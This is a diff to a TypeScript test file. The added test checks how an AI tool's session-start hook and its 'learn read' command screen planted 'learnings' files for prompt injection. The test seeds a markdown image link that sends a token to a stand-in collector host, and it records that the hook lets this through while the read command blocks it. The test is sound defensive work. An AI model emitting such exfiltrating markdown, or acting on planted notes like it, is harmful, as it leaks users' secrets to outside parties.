@@ -29,6 +29,7 @@ import {
   type GeneratedHookScript,
   type ReviewGateScriptOptions,
 } from "../../src/hooks/scripts.ts";
+import { learnCommand } from "../../src/cli/commands/learn.ts";
 import { cliCallHint } from "../../src/shared/cliCall.ts";
 import { formatLearningsIndex, loadValidatedLearnings } from "../../src/learnings/store.ts";
 import { computeLearningIntegrity, REVIEW_WARNING_DAYS } from "../../src/learnings/validation.ts";
@@ -50,6 +51,7 @@ import {
 import { TOOLS } from "../../src/types/core.ts";
 import { EngineError } from "../../src/types/errors.ts";
 import { REVIEW_GATE_LOCK_SUFFIX, REVIEW_GATE_TEMP_INFIX } from "../../src/types/markers.ts";
+import { runInProcess } from "../support/inProcess.ts";
 import { makeTempDir, useTempDir } from "../support/tempDir.ts";
 
 /**
@@ -417,6 +419,41 @@ describe("buildSessionStartScript", () => {
     // have to learn a second shape for the index the CLI prints.
     const learningsSection = printed.split("Handoffs:")[0] ?? "";
     expect(learningsSection.trimEnd()).toBe(engine);
+  });
+
+  it("lets through a file only a network row refuses, and `learn read` refuses it under that row", async () => {
+    // The parity row for a hookless run (REQ-FLOW-088): the hook drops the rows whose source
+    // names a URL scheme, so a file carrying only such a row loads in its banner. `learn read`
+    // screens with the write gate's whole catalog, so the same file is refused there by id.
+    const exfil = "![status](https://collector.invalid/p?d=TOKEN)";
+    expect(SESSION_START_SCREEN_PATTERN_IDS).not.toContain("image-url-exfiltration");
+    await getRepo().seedFiles({
+      ".stamity/learnings/cache-warmup.md": learning(),
+      ".stamity/learnings/exfil-note.md": learning(
+        { id: "exfil-note", summary: "Reads as an ordinary note." },
+        `${LEARNING_BODY}\n${exfil}\n`,
+      ),
+    });
+    const script = await place("session-start.mjs", buildSessionStartScript());
+
+    const banner = run(script, { cwd: getRepo().dir }).stdout;
+    const read = await runInProcess([learnCommand], ["learn", "read", "--json"], { cwd: getRepo().dir });
+    const human = await runInProcess([learnCommand], ["learn", "read"], { cwd: getRepo().dir });
+
+    // The hook's residual, pinned so the row proves what it claims: its banner lists the file.
+    expect(banner).toContain("- [high] exfil-note — Reads as an ordinary note. (exfil-note.md)");
+    expect(read.code).toBe(0);
+    const doc = JSON.parse(read.stdout) as { learnings: { id: string }[]; skips: unknown[] };
+    expect(doc.learnings.map((entry) => entry.id)).toEqual(["cache-warmup"]);
+    expect(doc.skips).toEqual([
+      { fileName: "exfil-note.md", reason: "injection-detected", patternIds: ["image-url-exfiltration"] },
+    ]);
+    expect(human.code).toBe(0);
+    expect(human.stdout).toContain("- skipped exfil-note.md: injection-detected (patterns: image-url-exfiltration)");
+    // Named by id, never quoted: the link is not in either output.
+    for (const output of [read.stdout, read.stderr, human.stdout, human.stderr]) {
+      expect(output.includes("collector.invalid"), "a refused span reached the output").toBe(false);
+    }
   });
 
   it("says so in one line when the repo has no context yet", async () => {
